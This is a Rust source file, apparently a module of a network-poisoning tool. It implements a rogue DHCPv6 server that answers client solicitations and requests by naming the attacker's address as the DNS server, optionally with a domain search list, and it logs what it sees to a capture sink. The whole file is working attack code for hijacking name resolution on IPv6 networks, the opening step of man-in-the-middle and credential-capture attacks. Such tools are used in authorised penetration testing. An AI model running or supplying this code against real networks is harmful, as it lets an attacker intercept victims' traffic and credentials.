//! Rogue DHCPv6 server (UDP 547). Answers SOLICIT/REQUEST/INFORMATION-REQUEST advertising
//! ourselves as the DNS server, with an optional domain filter.

use std::net::{Ipv6Addr, SocketAddr};
use std::sync::Arc;

use crate::capture::CaptureSink;
use crate::capture::model::Protocol;
use crate::logger::Logger;

use super::{PoisonConfig, query_event};

const OPT_CLIENTID: u16 = 1;
const OPT_SERVERID: u16 = 2;
const OPT_DNS_SERVERS: u16 = 23;
const OPT_DOMAIN_LIST: u16 = 24;

const MSG_SOLICIT: u8 = 1;
const MSG_ADVERTISE: u8 = 2;
const MSG_REQUEST: u8 = 3;
const MSG_REPLY: u8 = 7;
const MSG_INFO_REQUEST: u8 = 11;

fn option(pkt: &[u8], want: u16) -> Option<&[u8]> {
    let mut i = 4; // msg-type(1) + txid(3)
    while i + 4 <= pkt.len() {
        let code = u16::from_be_bytes([pkt[i], pkt[i + 1]]);
        let len = u16::from_be_bytes([pkt[i + 2], pkt[i + 3]]) as usize;
        let start = i + 4;
        let end = start + len;
        if end > pkt.len() {
            return None;
        }
        if code == want {
            return Some(&pkt[start..end]);
        }
        i = end;
    }
    None
}

/// Build a DHCPv6 reply for a request, advertising `server_ipv6` as DNS.
pub fn build_reply(req: &[u8], server_ipv6: Ipv6Addr, domains: &[String]) -> Option<Vec<u8>> {
    if req.len() < 4 {
        return None;
    }
    let msg_type = req[0];
    let reply_type = match msg_type {
        MSG_SOLICIT => MSG_ADVERTISE,
        MSG_REQUEST | MSG_INFO_REQUEST => MSG_REPLY,
        _ => return None,
    };
    let mut out = vec![reply_type];
    out.extend_from_slice(&req[1..4]); // txid

    // Server DUID (type 3 = DUID-LL, hw type 1, 6-byte mac placeholder).
    let mut duid = vec![0x00, 0x03, 0x00, 0x01];
    duid.extend_from_slice(&[0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
    push_option(&mut out, OPT_SERVERID, &duid);

    if let Some(client_id) = option(req, OPT_CLIENTID) {
        push_option(&mut out, OPT_CLIENTID, client_id);
    }
    // DNS servers
    push_option(&mut out, OPT_DNS_SERVERS, &server_ipv6.octets());
    // Domain search list (DNS wire format, no compression) from the filter.
    if !domains.is_empty() {
        let mut list = Vec::new();
        for d in domains {
            for label in d.split('.') {
                if label.is_empty() {
                    continue;
                }
                list.push(label.len() as u8);
                list.extend_from_slice(label.as_bytes());
            }
            list.push(0);
        }
        if !list.is_empty() {
            push_option(&mut out, OPT_DOMAIN_LIST, &list);
        }
    }
    Some(out)
}

fn push_option(out: &mut Vec<u8>, code: u16, value: &[u8]) {
    out.extend_from_slice(&code.to_be_bytes());
    out.extend_from_slice(&(value.len() as u16).to_be_bytes());
    out.extend_from_slice(value);
}

pub async fn run(
    bind_ip: Ipv6Addr,
    cfg: Arc<PoisonConfig>,
    sink: CaptureSink,
    logger: Arc<Logger>,
) -> anyhow::Result<()> {
    let bind = SocketAddr::from((bind_ip, crate::constants::DHCPV6_PORT));
    let sock = super::bind_udp(bind, true, None)?;
    logger.info("DHCPv6 poisoned on 547");
    let mut buf = vec![0u8; 4096];
    loop {
        let (n, src) = sock.recv_from(&mut buf).await?;
        let name = option(&buf[..n], OPT_CLIENTID)
            .map(|_| "DHCPv6")
            .unwrap_or("DHCPv6");
        sink.query(query_event(
            Protocol::Dns,
            src.ip(),
            name,
            &format!("type={}", buf[0]),
            !cfg.analyze,
            cfg.analyze,
        ));
        if cfg.analyze {
            continue;
        }
        let server_ip = cfg.answer_ipv6.unwrap_or(Ipv6Addr::LOCALHOST);
        if let Some(reply) = build_reply(&buf[..n], server_ip, &cfg.domains) {
            let _ = sock.send_to(&reply, src).await;
        }
    }
}
